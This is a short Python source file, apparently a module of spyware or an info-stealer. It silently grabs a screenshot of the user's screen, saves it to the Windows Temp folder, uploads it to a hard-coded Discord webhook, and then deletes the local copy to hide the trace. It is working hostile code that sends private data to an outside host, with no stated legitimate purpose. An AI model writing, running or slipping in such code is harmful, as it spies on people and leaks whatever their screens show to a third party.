import os.path, requests, os
from PIL import ImageGrab

def sikrinsat():
    user = os.path.expanduser("~")

    hook = "https://discord.com/api/webhooks/1090077174641463457/4bnLNsh75UzDAEzk0PsDqdV1R2w9CD32pAjI8jlY93surPEmSwt-PRKZ9mzS-TcQ9FR3"

    captura = ImageGrab.grab()
    captura.save(user+"\\AppData\\Local\\Temp\\ss.png")

    file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
    r = requests.post(hook, files=file)
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
    except:
        pass
        
